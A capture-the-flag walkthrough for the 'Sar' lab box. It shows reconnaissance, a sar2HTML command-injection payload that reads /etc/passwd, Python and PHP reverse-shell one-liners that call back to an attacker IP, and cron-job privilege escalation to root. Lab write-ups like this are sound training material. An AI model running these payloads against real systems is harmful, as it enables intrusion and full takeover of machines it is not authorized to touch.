### A step-by-step walkthrough of the box **"Sar"** exploiting sar2HTML via Remote Code Execution (RCE)
- **Box Host:** Offensive Security Proving Grounds
- **Difficulty Rating:** Easy
- **Starting Location:** Kali VM in the same subnet

- - - 
*Note 1: The IP addresses, URLs, and flags used in this demonstration were specific to the environment at the time of the exploit and will likely be different when another attempt at this box is made.*

*Note 2: There is almost always more than one way to expoit a box (TIMTOWTDI). The demonstration and tools shown here are probablyy not the only method you can use.*
- - -

### Step 1: Network Scanning
Perform a stealth scan of the entire subnet to identify target machine
```
nmap -sS [ip range]
```

- identify open ports
- open ip address in browser
  * shows default Apache page

- - -

### Step 2: Directory Brute Force
Perform a directory brute force with the tool of your choice
```
gobuster dir -u [url] -w [path to wordlist]
```
- identifies robot.txt
- Download the file with *curl* and inspect
```
curl [url]/robots.txt
```
```
cat robots.txt
```
  - text file says **sar2HTML**
  * try running in browser: http://ipaddress/sar2HTML/
  * shows that it is a tool running on the server

- - -

### Step 3: Research sar2HTML for vulnerabilities
Research to find **sar2HTML** exploit
- Exploit-DB shows Sar2HTML 3.2.1 has an RCE (no CVE)
- Exploit = *http:192.168.1.24/sar2HTML/index.php?plot=;your-command*
- Example:

```
http:192.168.1.24/sar2HTML/index.php?plot=; cat /etc/passwd
```

- - - 

### Step 4: Setup a Reverse Shell
Run a basic Python command to see if it is installed

```
python3 --help
```

- The output provided shows this is a success and python3 is installed

Setup a netcat listener in your terminal:
```
nc -lvp 1234
```

- Run a python3 script to connect to a reverse shell:

```
python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.20”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);
```

- Successfully connected:

- Setup a stable shell (optional):

```
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```

- **user flag can be found here** (/home/love/Desktop/user.txt)

- - -

### step 5 (final): Gain Root
  - Find exploits based on OS and kernel versions
    - no luck
  - Check weak file permission and processes
    - Found a **cron job** is being run as a root user
      - > cat /etc/crontab
    - Cron job = ***/5 * * * * root cd /var/www/html/ && sudo ./finally.sh**
    - Navigate to /var/www/html/ and see what is there
      - finally.sh is calling write.sh
      - write.sh is create a folder in temp directory
      - the command **ls -l** shows we can edit write.sh
      - Add a php reverse connection command into write.sh

```
php -r ‘$sock=fsockopen(“192.168.1.20”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
```
  * IP address = attacker machine (mine)
  * Setup listener **nc -lvp 4444**
  * Wait 5 mins for cron job
  - **root flag: cat /root/root.txt**

### Echo the php script into the write.sh file
```
echo "php -r '\$sock=fsockopen(\"192.168.57.200\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```
- echo requires a \ in front of a $ and " (probably more)
